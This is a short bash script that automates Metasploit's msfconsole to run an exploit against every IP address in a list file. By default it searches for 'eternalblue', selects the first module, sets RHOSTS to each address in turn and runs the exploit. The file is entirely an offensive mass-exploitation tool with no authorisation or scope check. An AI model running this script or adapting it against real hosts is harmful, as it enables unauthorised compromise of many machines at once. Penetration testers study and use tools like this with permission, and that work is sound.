#!/bin/bash

usage() {
  echo "Usage: $0 -l <ip_list_file> [-use <value>] [-search <value>]"
  echo "  -l <ip_list_file>  : Path to the IP list file containing the IP addresses to be processed"
  echo "  -use <value>       : Custom command to use instead of the default 'use 0' (default is 'use 0')"
  echo "  -search <value>    : Custom search query instead of the default 'search eternalblue' (default is 'search eternalblue')"
  echo "  -h                 : Display this help message"
  echo ""
  echo "This script automates the process of running Metasploit commands against a list of IP addresses."
  echo ""
  echo "Steps performed by the script:"
  echo "1. Reads the IP addresses from the provided IP list file."
  echo "2. For each IP address, it runs the following commands in msfconsole:"
  echo "   a. <custom or default search query>"
  echo "   b. <custom or default 'use' command>"
  echo "   c. set RHOSTS <ip_value>"
  echo "   d. exploit"
  echo "3. Displays the output of each command for each IP address."
  echo ""
  echo "Example usage:"
  echo "$0 -l /path/to/iplist.txt -use 'use 1' -search 'search smb'"
  exit 1
}

# Default values for the use and search commands
USE_CMD="use 0"
SEARCH_CMD="search eternalblue"

# Check if no arguments are provided
if [[ $# -eq 0 ]]; then
  usage
fi

# Parse the command-line arguments
while [[ $# -gt 0 ]]; do
  key="$1"
  case $key in
    -l)
      IP_LIST="$2"
      shift # past argument
      shift # past value
      ;;
    -use)
      USE_CMD="$2"
      shift # past argument
      shift # past value
      ;;
    -search)
      SEARCH_CMD="$2"
      shift # past argument
      shift # past value
      ;;
    -h)
      usage
      ;;
    *)
      usage
      ;;
  esac
done

# Check if the IP list file is provided and exists
if [[ -z $IP_LIST || ! -f $IP_LIST ]]; then
  echo "IP list file not found or not provided!"
  usage
fi

# Read the IP list and execute the commands for each IP
while IFS= read -r ip_value; do
  echo "Processing IP: $ip_value"
  msfconsole -q -x "$SEARCH_CMD; $USE_CMD; set RHOSTS $ip_value; exploit; exit"
done < "$IP_LIST"

echo "All IPs processed."
